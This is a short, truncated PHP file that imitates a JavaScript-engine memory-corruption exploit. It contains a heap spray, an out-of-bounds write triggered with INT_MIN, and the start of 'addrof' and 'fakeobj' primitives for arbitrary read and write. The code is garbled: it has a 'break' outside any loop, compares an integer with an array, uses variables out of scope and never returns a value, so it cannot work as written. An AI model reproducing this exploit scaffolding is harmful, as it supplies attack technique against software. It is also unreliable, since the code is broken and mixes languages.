<?php

function hax($arr, $n) {
    $n |= 0;

    if ($n < 0) {
        $v = (-$n) | 0;

        $i = abs($n);

        if ($i < $arr) {
            if ($i & 0x80000000) {
                $i += -0x7fffffff9;
            }

            if ($i > 0) {
                $arr[$i] = 1.04380972981885e-310;
            }
        }
    }
}

function setup_addrof_fakeobj() {
    $noCoW = 13.37;

    $spray = [];
    for ($i = 0; $i < 10000; $i++) {
        $spray[] = [$noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    }

    $target = [$noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    $float_arr = [$noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    $obj_arr = [[], [], [], [], [], [], []];

    $n = -4;
    if ($i % 10000 == 0) {
        $n = -2147483648; // INT_MIN
    }
    hax($target, $n);
    if (count($float_arr) == 0x1337) {
        break;
    }
}

function setup_rw() {
    log("Running in ". (IN_BROWSER? "browser" : "shell"). " environment");

    $offsets = resolve_offsets();

    list($raw_addrof, $raw_fakeobj) = setup_addrof_fakeobj();

    function addrof($obj) {
        $obj_arr[0] = $obj;
        return $float_arr[8];
    }

    function fakeobj($addr) {
        $float_arr[8] = $addr
